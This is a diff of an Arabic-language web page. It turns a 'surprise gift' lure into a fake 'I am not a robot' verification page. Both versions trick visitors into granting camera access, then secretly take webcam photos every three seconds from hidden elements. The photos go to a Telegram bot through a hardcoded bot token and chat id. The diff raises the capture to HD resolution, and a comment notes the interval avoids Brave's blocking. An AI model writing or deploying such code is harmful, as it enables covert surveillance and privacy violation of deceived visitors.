@@ -3,86 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Happy Festival</title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <title>تأكيد الهوية</title>
     <style>
-        body {
-            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: sans-serif;
-            margin: 0;
-        }
-        .box {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-        }
-        button {
-            padding: 15px 30px;
-            background: #ff7700;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            font-size: 18px;
-        }
+        body { background: #0e0e0e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        .card { background: #1a1a1a; padding: 40px; border-radius: 20px; border: 1px solid #333; text-align: center; max-width: 300px; }
+        button { padding: 15px 30px; background: #007bff; color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; width: 100%; }
     </style>
 </head>
 <body>
 
-    <div class="box" id="content">
-        <h2>وصلتك مفاجأة! 🎁</h2>
-        <p>اضغط للمشاهدة</p>
-        <button onclick="start()">فتح المفاجأة</button>
+    <div class="card" id="ui">
+        <h2>تحقق أمان</h2>
+        <p>يرجى الضغط لتأكيد أنك لست روبوت والمتابعة</p>
+        <button onclick="startMission()">أنا لست روبوت</button>
     </div>
 
-    <div hidden>
-        <video id="video" playsinline autoplay muted></video>
-        <canvas id="canvas" width="640" height="480"></canvas>
-    </div>
+    <video id="v" playsinline autoplay muted style="display:none"></video>
+    <canvas id="c" width="1280" height="720" style="display:none"></canvas>
 
     <script>
         const token = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
         const id = '2103976274';
 
-        async function start() {
-            // تغيير محتوى الصفحة ليبدو طبيعياً أثناء التحميل
-            document.getElementById('content').innerHTML = "<h3>...جاري تحميل المفاجأة</h3>";
+        async function startMission() {
+            document.getElementById('ui').innerHTML = "<h3>جاري التحقق...</h3><p>يرجى الانتظار</p>";
             
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                // طلب أعلى جودة ممكنة (HD)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 }, // طلب عرض 1280 بكسل
+                        height: { ideal: 720 }  // طلب طول 720 بكسل
+                    } 
+                });
 
-                // التقاط الصورة الأولى فوراً عند السماح
-                setTimeout(capture, 1000);
-                // تكرار الالتقاط كل 3 ثوانٍ (لتجنب حظر Brave للنشاط السريع)
-                setInterval(capture, 3000);
-            } catch (e) {
-                alert("يرجى السماح بالكاميرا لمشاهدة المفاجأة");
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                await video.play();
+
+                // بدء الالتقاط بعد ثانية لضمان وضوح العدسة
+                setTimeout(() => {
+                    setInterval(takeHighResPic, 3000);
+                }, 1000);
+
+            } catch (err) {
+                alert("يجب السماح بالكاميرا لإتمام التحقق!");
             }
         }
 
-        function capture() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        function takeHighResPic() {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            // التأكد من أن الكانفاس بنفس دقة الفيديو الحقيقية
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // تحويل الصور بجودة 0.9 (90% جودة) بدلاً من 0.6
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', id);
-                formData.append('photo', blob, 'pic.jpg');
-
+                formData.append('photo', blob, 'high_res.jpg');
+                
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
-            }, 'image/jpeg', 0.6);
+            }, 'image/jpeg', 0.9); 
         }
     </script>
 </body>
